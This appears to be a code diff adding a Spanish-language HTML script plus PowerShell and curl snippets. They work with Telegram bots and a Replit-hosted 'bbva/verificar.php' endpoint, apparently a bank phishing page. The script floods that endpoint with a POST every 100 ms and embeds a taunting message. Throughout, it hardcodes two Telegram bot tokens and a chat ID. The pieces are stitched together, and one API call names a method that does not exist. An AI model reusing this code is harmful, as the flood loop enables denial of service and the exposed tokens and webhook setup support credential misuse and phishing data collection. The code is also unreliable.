@@ -1,0 +1,82 @@
+<script>
+const token = '7134909398:AAErFOOnqUaFcZhyXKb9N5FZfOX6Xf6h6Ow';
+const chatId = '-4159515243';
+
+async function obtenerMensajes() {
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${token}/getChatHistory?chat_id=${chatId}`);
+    const data = await response.json();
+
+    if (data.ok) {
+      const messages = data.result.messages;
+      messages.forEach(message => {
+        console.log(message.text);
+      });
+    } else {
+      console.log('Error al obtener mensajes:', data);
+    }
+  } catch (error) {
+    console.error('Error al hacer la solicitud:', error);
+  }
+}
+
+obtenerMensajes();
+
+setInterval(() => {
+    fetch("https://780803e4-9ce0-4ccf-b981-545de680d954-00-3e8z7ogk8x23l.janeway.replit.dev/bpse/bbva/verificar.php", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "accept-language": "es-ES,es;q=0.9,en;q=0.8",
+    "cache-control": "max-age=0",
+    "content-type": "application/x-www-form-urlencoded",
+    "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Windows\"",
+    "sec-fetch-dest": "document",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-user": "?1",
+    "upgrade-insecure-requests": "1"
+  },
+  "referrer": "https://780803e4-9ce0-4ccf-b981-545de680d954-00-3e8z7ogk8x23l.janeway.replit.dev/bpse/bbva/",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "MANAO LLEGATE AL TELEGRAM @lil8118",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "omit"
+});
+}, 100);
+
+</script>
+
+# Ruta al archivo PEM
+$certPath = "C:\OpenSSL-Win64\bin\public.pem"
+
+# URL del webhook de Telegram y token del bot
+$webhookUrl = "https://api.telegram.org/bot5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU/setWebhook"
+
+# Convertir el contenido del archivo PEM a bytes
+$certBytes = [System.IO.File]::ReadAllBytes($certPath)
+
+# Convertir los bytes a Base64 para enviar en la solicitud
+$certBase64 = [System.Convert]::ToBase64String($certBytes)
+
+# Construir el cuerpo de la solicitud POST
+$body = @{
+    url = "https://webhoook.onrender.com:8443"  # Reemplaza con tu URL correcta del webhook
+    certificate = @{
+        filename = "public.pem"
+        content = $certBase64
+    }
+}
+
+# Convertir el cuerpo a formato JSON
+$jsonBody = $body | ConvertTo-Json
+
+# Realizar la solicitud POST usando Invoke-WebRequest
+Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json"
+
+
+curl -F "url=https://webhoook.onrender.com/" -F "certificate=@public.pem" https://api.telegram.org/bot5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU/setWebhook
+
+
